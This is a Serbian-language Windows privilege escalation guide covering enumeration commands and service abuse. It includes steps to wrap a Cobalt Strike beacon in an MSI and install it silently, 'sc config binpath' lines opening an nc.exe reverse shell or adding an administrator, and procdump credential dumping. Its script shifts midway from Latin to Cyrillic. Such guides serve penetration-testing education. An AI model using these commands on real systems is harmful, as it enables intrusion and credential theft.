Pročitajte ovaj tutorijal da biste saznali kako da napravite MSI wrapper koristeći ove alate. Imajte na umu da možete da upakujete datoteku "**.bat**" ako samo želite da **izvršite** **komandne linije**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Kreiranje MSI-ja pomoću WIX-a


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Kreiranje MSI-ja pomoću Visual Studio-a

- Pomoću Cobalt Strike-a ili Metasploit-a **generišite** novi Windows EXE TCP payload u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i u polje za pretragu unesite „installer“. Izaberite projekat **Setup Wizard** i kliknite na **Next**.
- Dodelite projektu ime, na primer **AlwaysPrivesc**, izaberite `C:\privesc` kao lokaciju, označite **place solution and project in the same directory** i kliknite na **Create**.
- Nastavite da klikćete na **Next** dok ne stignete do koraka 3 od 4 (izbor datoteka za uključivanje). Kliknite na **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite na **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer**-u i u odeljku **Properties** promenite **TargetPlatform** sa **x86** na **x64**.
  - Možete da promenite i druga svojstva, kao što su **Author** i **Manufacturer**, čime instalirana aplikacija može da izgleda legitimnije.
- Kliknite desnim tasterom miša na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom miša na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite datoteku **beacon.exe** i kliknite na **OK**. Time ćete obezbediti da se Beacon payload izvrši čim se pokrene instalacioni program.
- U odeljku **Custom Action Properties** promenite **Run64Bit** na **True**.
- Na kraju, **izgradite projekat**.
  - Ako se prikaže upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste postavili platformu na x64.

### Instalacija MSI-ja

Da biste **instalirali** zlonamernu `.msi` datoteku **u pozadini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Da biste iskoristili ovu ranjivost, možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirus i detektori

### Postavke nadzora

Ove postavke određuju šta se **beleži**, zato treba da obratite pažnju

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, zanimljivo je znati gde se šalju logovi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** je osmišljen za **upravljanje lozinkama lokalnog Administrator naloga**, čime se obezbeđuje da svaka lozinka bude **jedinstvena, nasumično generisana i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se bezbedno čuvaju u Active Directory-ju i mogu im pristupiti samo korisnici kojima su dodeljene odgovarajuće dozvole putem ACL-ova, što im omogućava da vide lozinke lokalnog administratora ako su za to ovlašćeni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **lozinke u otvorenom tekstu čuvaju se u LSASS-u** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Počev od **Windows 8.1**, Microsoft je uveo poboljšanu zaštitu za Lokalni bezbednosni autoritet (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubacuju kod, čime se dodatno štiti sistem.\
[**Više informacija o LSA Protection potražite ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti akreditive sačuvane na uređaju od pretnji kao što su pass-the-hash napadi. [**Više informacija o Credential Guard-u dostupno je ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Keširani akreditivi

**Domenske akreditive** proverava **Lokalni bezbednosni autoritet** (LSA), a koriste ih komponente operativnog sistema. Kada registrovani bezbednosni paket proveri korisnikove podatke za prijavu, obično se uspostavljaju domenski akreditivi za tog korisnika.\
[**Više informacija o keširanim akreditivima ovde**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Korisnici i grupe

### Enumerisanje korisnika i grupa

Proverite da li neka od grupa kojima pripadate ima zanimljive dozvole.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda ćete moći da eskalirate privilegije**. Ovde saznajte više o privilegovanim grupama i kako da ih zloupotrebite za eskalaciju privilegija:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali više o zanimljivim tokenima** i kako da ih zloupotrebite:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / Sesije

```bash
qwinsta
klist sessions
```

### Kućne fascikle

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Politika lozinki

```bash
net accounts
```

### Preuzmite sadržaj međuspremnika

```bash
powershell -command "Get-Clipboard"
```

## Pokrenuti procesi

### Dozvole za datoteke i fascikle

Pre svega, prilikom izlistavanja procesa **proverite da li se lozinke nalaze u komandnoj liniji procesa**.\
Proverite da li možete **da zamenite neku pokrenutu binarnu datoteku** ili imate dozvole za pisanje u fasciklu binarne datoteke kako biste iskoristili moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md); mogli biste da ih zloupotrebite za eskalaciju privilegija.

Debugger listener može kratko da traje, pa njegovo odsustvo iz jednog pasivnog snimka portova ne dokazuje da nikada nije bio izložen. Povežite svaki uočeni listener sa njegovim PID-om, vlasnikom procesa i mogućnošću pristupa nižeprivilegovanog korisnika; samo naziv aplikacije ili debug flag ne dokazuju izvršavanje koda između korisnika. Redovno enumerisanje obavljajte pasivno, bez slanja debugger komandi.

**Provera dozvola binarnih datoteka procesa**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Provera dozvola fascikli u kojima se nalaze binarne datoteke procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Direktorijumi za Snort dynamic preprocessor

Snort 2 može da učitava deljene biblioteke iz direktorijuma `dynamicpreprocessor directory` navedenog u konfiguraciji izabranoj pomoću `snort.exe -c <config>`. Ako zakazani zadatak ili servis pokreće Snort pod drugim nalogom, proverite baš tu konfiguraciju i ACL direktorijuma navedenog za module. Ako vaš token može da kreira datoteke u tom direktorijumu, putanja je kandidat za proveru zbog mogućeg izvršavanja koda kada taj zadatak ili servis sledeći put učita module. Proverite efektivne privilegije naloga pod kojim se proces pokreće, aktivnu konfiguraciju, kompatibilnost modula i sva ograničenja zabrane ili deljenja; mogućnost upisivanja u direktorijum sama po sebi ne dokazuje eskalaciju. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) opisuje učitavanje modula tokom izvršavanja.

### Privilegovani web servis sa upisivim korenom dokumenata

Na Windows instalaciji Apache-a, uporedite putanju izvršne datoteke servisa i nalog pod kojim se pokreće sa vrednošću `DocumentRoot` u aktivnoj datoteci `httpd.conf`. Za uobičajeni XAMPP raspored, proverite `C:\xampp\apache\conf\httpd.conf` i ACL konfigurisanog korena dokumenata, često `C:\xampp\htdocs`. Ako korisnik sa nižim privilegijama može da kreira datoteke u tom korenu dok Apache radi kao `LocalSystem`, izvršavanje koda može preći granicu privilegija hosta. Potvrdite da servis radi, da se poslužuje tačna putanja i da rukovalac na strani servera obrađuje taj tip datoteke; sam upisiv koren dokumenata dokazuje samo mogućnost kreiranja datoteka. Proverite ACL-ove bez upisivanja probne datoteke:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Za konvencionalnu WAMP instalaciju, servis može da upućuje na verzionisani `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ili `C:\wamp\...` za 32-bitni raspored), sa konfiguracijom pored njega u `conf\httpd.conf` i podrazumevanim korenom `C:\wamp64\www` ili `C:\wamp\www`. Zajedno proverite tačnu izvršnu datoteku servisa, identitet pod kojim se pokreće, efektivni `DocumentRoot` (uključujući razrešavanje `${INSTALL_DIR}` i zamene u virtuelnim hostovima) i ACL korena. Direktorijum WAMP sa dozvolom za upis ne dokazuje da se Apache pokreće kao `SYSTEM` niti da izvršava poslatu datoteku. [Apache dokumentuje kako Windows servis određuje konfiguraciju](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### IIS koren sa dozvolom za upis i mrežni identitet skupa aplikacija

Za IIS, u `applicationHost.config` povežite fizički direktorijum sa dozvolom za upis sa **aktivnim sajtom/aplikacijom**, a zatim utvrdite konfigurisani skup i rukovalac na strani servera. Kod smešten u direktorijumu koji se prikazuje izvršava se kao skup samo ako IIS obrađuje taj tip datoteke i ruta je dostupna. Pre nego što direktorijum sa dozvolom za upis smatrate mogućnošću za izvršavanje koda, proverite efektivni pristup trenutnog korisnika za kreiranje datoteka, stanje sajta tokom rada, rukovalac i nadjačavanja za konkretnu putanju.

Dinamičko kompajliranje ASP.NET-a uvodi zasebnu putanju za proveru: generisane datoteke u direktorijumu za kompajliranje aplikacije. Podrazumevano se koristi direktorijum `Temporary ASP.NET Files` unutar odgovarajuće instalacije .NET Framework-a, ali `<compilation tempDirectory>` u aplikaciji može to da promeni. [Microsoft dokumentuje lokaciju i poddirektorijume za pojedinačne aplikacije](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) i [preporučuje izolovanje direktorijuma za kompajliranje kada skupovi aplikacija nemaju međusobno poverenje](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ako token sa nižim privilegijama može da menja generisani izvorni kod u kešu **konkretne** aplikacije, utvrdite da li ga ta aplikacija ponovo kompajlira pod privilegovanijim [identitetom radnog procesa](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sam ACL datoteke ili direktorijuma ne dokazuje izvršavanje koda: povežite keš sa aktivnom aplikacijom, efektivnim tokenom i ACL-om, postavkama kompajliranja, identitetom procesa i vremenom eventualnog ponovnog kompajliranja. Koristite samo pregled metapodataka, bez menjanja datoteka keša ili pokretanja kompajliranja tokom enumeracije.

Skup IIS-a konfigurisan kao `ApplicationPoolIdentity` ili `NetworkService` obično se autentifikuje на доменске ресурсе као **налог рачунара домаћина**, иако његов локални токен може имати мало привилегија. `LocalSystem` већ има високе привилегије локално, а на мрежи такође користи налог рачунара; `LocalService` обично користи анонимне акредитиве за мрежу. Скуп `SpecificUser` користи конфигурисани налог. [Microsoft документује ове типове идентитета](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) и [мрежни идентитет скупа апликација](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ако поставка идентитета није наведена, могу се наследити подразумеване вредности скупа, које се разликују међу генерацијама IIS-а, па разрешите ефективну конфигурацију уместо да нагађате на основу назива скупа. Ако извршавање кода стигне до скупа са мрежним идентитетом рачунара, процените права директоријума за **конкретни рачунар**. [DCSync](../active-directory-methodology/dcsync.md) захтева права репликације над контекстом именовања домена; тикет налога рачунара или улога домаћина сами по себи их не доказују. Пасивна енумерација треба да прегледа конфигурацију и ACL-ове, без отпремања датотеке, покретања мрежне аутентификације или захтевања тикета.

За ASP.NET руковалац коме се може приступити и који покреће помоћни процес, пратите сваку вредност изведену из захтева кроз аутентификацију, дешифровање, валидацију и конструкцију команде. Руковалац који спаја декодирани токен у `ProcessStartInfo("cmd", "/c ...")` може омогућити да метазнакови љуске промене команду; [Microsoft документује специјалне знакове команде `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Утврдите да непоуздани позивалац заиста може да утиче на декодирану вредност и приступи руковаоцу, а затим разрешите ефективни идентитет скупа апликација или идентитет након импersonације и идентитет процеса-потомка. Читљива линија изворног кода, слушалац на localhost-у или слабост формата токена сами по себи не доказују извршавање привилеговане команде. Током пасивне енумерације прегледајте изворни код и конфигурацију скупа, без слања фалсификованих захтева или покретања помоћног процеса.

За PHP сервис на Windows-у, путања којом управља захтев и која се прослеђује у [`include` или `require`](https://www.php.net/manual/en/function.include.php) може да изврши PHP датотеку коју може да мења корисник са нижим привилегијама, под идентитетом радног процеса. Потврдите да захтев може да стигне до те инструкције, да разрешена путања именује датотеку коју корисник са нижим привилегијама може да измени, а радни процес да прочита, да ограничења PHP путање дозвољавају укључивање и да радни процес заиста ради са вишим привилегијама. Слушалац на loopback адреси или датотека са дозволом за упис сами по себи не доказују овај ланац; прегледајте изворни код, идентитет сервиса и ACL-ове датотека без позивања крајње тачке током пасивне енумерације.

### Проналажење лозинки у меморији

Можете да направите дамп меморије покренутог процеса помоћу **procdump** алатке из sysinternals. Сервиси као што је FTP имају **акредитиве у чистом тексту у меморији**; покушајте да направите дамп меморије и прочитате акредитиве.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Nezaštićene GUI aplikacije

**Aplikacije koje rade kao SYSTEM mogu omogućiti korisniku da pokrene CMD ili pregleda direktorijume.**

Primer: „Windows Help and Support“ (Windows + F1), pretražite „command prompt“, kliknite na „Click to open Command Prompt“

### Uvoz projektnih datoteka sa povišenim privilegijama

Aplikacija koja automatski otvara projekte iz padajućeg direktorijuma u koji korisnik sa nižim privilegijama može da upisuje, prelazi granicu poverenja u ulaznim podacima pod nalogom uvoznika. Proverite **tačnu putanju u koju može da se upisuje**, proces ili zadatak koji je otvara, njegov efektivni identitet i verziju parsera. [Istorijski problem sa otvaranjem/obnavljanjem Ghidra projekta](https://github.com/NationalSecurityAgency/ghidra/issues/71) dozvoljavao je spoljne XML entitete u metapodacima projekta; mrežni entitet na Windowsu mogao je da izazove autentifikaciju naloga koji obavlja uvoz, ako to dozvoljavaju [pravila za odlazni SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). Ovo je trag koji može dovesti do izlaganja akreditiva, a ne do neposrednog pristupa administratora: odgovor mora moći da se iskoristi kroz zasebnu odobrenu ili ranjivu putanju, a trenutne verzije treba proveriti u odnosu na stvarno stanje zakrpa. Nemojte otvarati posebno napravljeni projekat tokom pasivne enumeracije; pregledajte tok uvoza i ACL-ove.

## Servisi

Pravo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) nad objektom Service Control Manager-a (SCM) odvojeno je od prava nad postojećim servisom. Uspešan, samo za čitanje, [`OpenSCManager` zahtev za pristup](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) za to pravo predstavlja trag za proveru, a ne dokaz da se novi servis može pokrenuti. [`CreateService` vraća handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) sa pristupom servisu zatraženim prilikom kreiranja; kasnije ponovno otvaranje servisa podrazumeva zasebnu proveru pristupa i može da ne uspe čak i kada je moguće koristiti prvobitni handle. Zasebno proverite efektivni lokalni ili udaljeni token, dodeljena prava handle-a, nalog servisa, pravila pokretanja i putanju izvršne datoteke. Nemojte kreirati niti pokretati servis tokom pasivne enumeracije.

Za udaljenu putanju instalacije servisa, povežite ta SCM prava sa deljenim resursom na ciljnom sistemu u koji **ista mrežna prijava** može da upisuje, njegovim osnovnim NTFS ACL-om i lokalnom putanjom do izvršne datoteke koju nalog servisa može da pokrene. Nalog koji nije administratorski može da pređe ovu granicu ako postoje neuobičajeno široka SCM prava i putanja za postavljanje datoteke; administratorski deljeni resurs nije nužan uslov. Sam pristup za upis u deljeni resurs ili sam trag o mogućnosti kreiranja servisa preko SCM-a ne dokazuje da se novi servis može pokренути sa višim identitetom.

Postojeći servis može da pozove pomoćnu izvršnu datoteku prilikom pokretanja, gašenja ili nekog drugog događaja životnog ciklusa, čak i kada ta pomoćna datoteka nije navedena u njegovom `ImagePath`. Ako se ime pomoćne datoteke razreši u direktorijum u koji korisnik sa nižim privilegijama može da upisuje, a servis radi pod višim identitetom, nedostajuća pomoćna datoteka može biti kandidat za uslovnu zamenu. Potvrdite **stvarni kod servisa ili dokumentovano pozivanje pomoćne datoteke**, razrešenu putanju извршне датотеке и редослед претраге, права за креирање директоријума, идентитет сервиса и доступан окидач животног циклуса. Директоријум сервиса у који може да се уписује или сама недостајућа датотека не доказују да сервис учитава ту датотеку; током пасивног прегледа немојте покретати нити заустављати сервис.

За постојећи сервис, [`SERVICE_START` дозвољава прослеђивање аргумената функцији `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); то се разликује од [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Прегледајте код сервиса или документовани интерфејс пре него што право за покретање сматрате нечим више од права управљања. Ако користи аргумент који је изабрао позивалац као путању за евиденцију или извоз, проверите идентитет сервиса, тачан ток аргумента до уписа, ограничења путање и дозволе над **креираном датотеком**. Упис у заштићени директоријум може да доведе до ескалације само ако постоји засебан привилеговани процес или учитавач који прихвата ту датотеку; датотека евиденције у коју може да се уписује или само право покретања нису довољни. Пасивна инвентаризација не треба да покреће сервис нити да креира пробну датотеку.

За NSClient++ агент за надзор, датотека `nsclient.ini` доступна за читање представља **траг за проверу конфигурације**: у њој могу бити веб акредитиви, док `boot.ini` може да преусмери конфигурацију на другу локацију. Проверите стварни налог сервиса, WEB слушаоца и правила приступа, као и да ли аутентификована улога може да мења подешавања или скрипте. За привилеговано извршавање потребни су и `CheckExternalScripts` (или друга омогућена путања за извршавање), ефективно право за регистровање или измену команде и окидач који је покреће под идентитетом сервиса. Слушалац ограничен на loopback и даље може бити доступан локалном кориснику, али сама путања до датотеке, лозинка или слушалац не доказују постојање тих права. Током пасивне enumeracije прегледајте метаподатке и дозволе без приказивања тајни или позивања веб API-ја. Погледајте [распоред датотека NSClient++-а](https://nsclient.org/docs/concepts/file-layout/), [безбедносне смернице за веб и скрипте](https://nsclient.org/docs/setup/securing/) и [конфигурацију спољних скрипти](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

За сервис чији је `ImagePath` `nssm.exe`, проверите стварни налог под којим се сервис покреће и његову вредност `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM ту чува подређену апликацију](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), док је `AppDirectory` њен конфигурисани радни директоријум. Проверите ACL-ове подређене извршне датотеке и њеног надређеног директоријума пре него што права омотача сматрате целом границом сервиса. Локална WCF или SOAP крајња тачка коју та подређена апликација излаже представља засебан траг за проверу: потврдите да ли је слушалац доступан кориснику са нижим привилегијама, да ли тачна операција прихвата његов улаз и да ли подређени процес сервиса извршава небезбедну операцију под вишим идентитетом. Налог сервиса, URL крајње тачке или путања у коју може да се уписује сами по себи не доказују ескалацију; избегавајте позивање операција сервиса током пасивне enumeracije.

За прилагођену WCF операцију, пратите уносни стринг који контролише позивалац до сваког PowerShell runspace-а. [`Pipeline.Commands.AddScript` додаје текст скрипте](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), а [`Pipeline.Invoke` покреће pipeline`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` са Windows акредитивима за транспорт](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) аутентификује клијента, али засебно треба проверити овлашћење за позивање те **конкретне** операције и ефективни идентитет runspace-а. Путања од улаза корисника са нижим привилегијама до `AddScript`-а под вишим идентитетом сервиса представља границу за извршавање кода; порт који слуша, аутентификовани клијент или некоришћени метод у неповезаном склопу сами по себи нису доказ. Статички прегледајте распоређени сервис, уговор, овлашћења и подешавања impersonation-а без позивања крајње тачке током enumeracije.

Service Triggers омогућавају Windows-у да покрене сервис када се појаве одређени услови (активност named pipe/RPC крајње тачке, ETW догађаји, доступност IP адресе, повезивање уређаја, освежавање GPO-а итд.). Чак и без права SERVICE_START, често можете покренути привилеговане сервисе активирањем њихових окидача. Технике за enumeraciju и активацију погледајте овде:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Сервис за прикупљање дијагностичких података у Visual Studio-у

Инсталације Visual Studio-а са алатима за C/C++ могу да садрже `VSStandardCollectorService150`, дијагностички сервис конфигурисан да ради као `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) користио је junction и трку са object-manager-link-ом да преусмери ресетовање DACL-а сервиса. Демонстрирана ескалација је такође захтевала употребљиву путању за поправку MSI-ја преко Visual Studio Setup WMI Provider-а и циљну датотеку `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Компонента је исправљена у јануару 2024.

За пасивну тријажу проверите налог и бинарну путању тог сервиса, да ли постоји путања до Setup WMI компајлера и статус закрпа инсталиране компоненте. Сам унос сервиса, верзија производа Visual Studio или компајлерска датотека не доказују да је хост рањив. Преглед не захтева покретање сервиса нити покретање поправке.

Прибавите листу сервиса:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Dozvole

Možete koristiti **sc** da biste dobili informacije o servisu.

```bash
sc qc <service_name>
```

Preporučuje se da imate binarni fajl **accesschk** iz _Sysinternals_-a kako biste proverili potreban nivo privilegija za svaku uslugu.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Preporučuje se da proverite da li „Authenticated Users“ mogu da menjaju neku uslugu:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Ovde možete preuzeti accesschk.exe za XP](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje servisa

Ako dobijate ovu grešku (na primer, sa SSDPSRV):

_Došlo je do sistemske greške 1058._\
_Servis se ne može pokrenuti jer je onemogućen ili zato što nijedan omogućeni uređaj nije povezan s njim._

Možete ga omogućiti pomoću ove komande.

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Imajte na umu da servis upnphost zavisi od servisa SSDPSRV da bi radio (za XP SP1)**

**Drugo zaobilazno rešenje ovog problema** je pokretanje:

```
sc.exe config usosvc start= auto
```

### **Izmena putanje binarne datoteke servisa**

U scenariju u kojem grupa „Authenticated users“ ima **SERVICE_ALL_ACCESS** nad servisom, moguće je izmeniti izvršnu binarnu datoteku servisa. Da biste izmenili i izvršili **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponovno pokretanje servisa

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privilegije se mogu eskalirati pomoću različitih dozvola:

- **SERVICE_CHANGE_CONFIG**: Omogućava ponovno konfigurisanje binarne datoteke servisa.
- **WRITE_DAC**: Omogućava ponovno konfigurisanje dozvola, što omogućava menjanje konfiguracije servisa.
- **WRITE_OWNER**: Omogućava preuzimanje vlasništva i ponovno konfigurisanje dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost menjanja konfiguracije servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost menjanja konfiguracije servisa.

Za otkrivanje i iskorišćavanje ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole za binarne datoteke servisa

Ako se servis izvršava kao **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ili privilegovani domenski nalog, ali **korisnici sa niskim privilegijama mogu da menjaju EXE datoteku servisa ili njenu nadređenu fasciklu**, servis se često može preuzeti **zamenom binarne datoteke i ponovnim pokretanjem servisa**.

**Proverite da li možete da menjate binarnu datoteku koju izvršava servis** ili imate **dozvole za upis u fasciklu** u kojoj se binarna datoteka nalazi ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Sve binarne datoteke koje izvršava servis možete dobiti pomoću **wmic** (nije u system32), a dozvole proveriti pomoću **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Možete koristiti i **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Potražite opasne ACL-ove dodeljene grupama **`Everyone`**, **`BUILTIN\Users`** ili **`Authenticated Users`**, naročito **`(F)`**, **`(M)`** ili **`(W)`** na izvršnoj datoteci servisa ili direktorijumu koji je sadrži. Praktičan postupak zloupotrebe je:<sup>[[27]](#references)</sup>

1. Proverite nalog servisa i putanju do izvršne datoteke pomoću `sc qc <service_name>`.
2. Proverite da li je binarna datoteka upisiva pomoću `icacls <path>`.
3. Zamenite binarnu datoteku servisa payload-om ili validnom zlonamernom binarnom datotekom servisa.
4. Ponovo pokrenite servis pomoću `sc stop <service_name> && sc start <service_name>` (ili sačekajte ponovno pokretanje sistema / okidač servisa).

Korisne automatizovane provere:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ako usluga ne dozvoljava običnom korisniku da je ponovo pokrene, proverite da li se automatski pokreće pri podizanju sistema, da li ima akciju za slučaj greške koja je ponovo pokreće ili može li se indirektno pokrenuti pomoću aplikacije koja je koristi.

### Dozvole za izmenu registra usluge

Trebalo bi da proverite da li možete da izmenite neki registar usluge.\
Možete da **proverite** svoje **dozvole** nad **registrom** usluge na sledeći način:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Originalni test dozvola bio je formulisan ovako:

Treba proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole `FullControl`. Ako ih imaju, moguće je izmeniti binarnu datoteku koju servis izvršava.

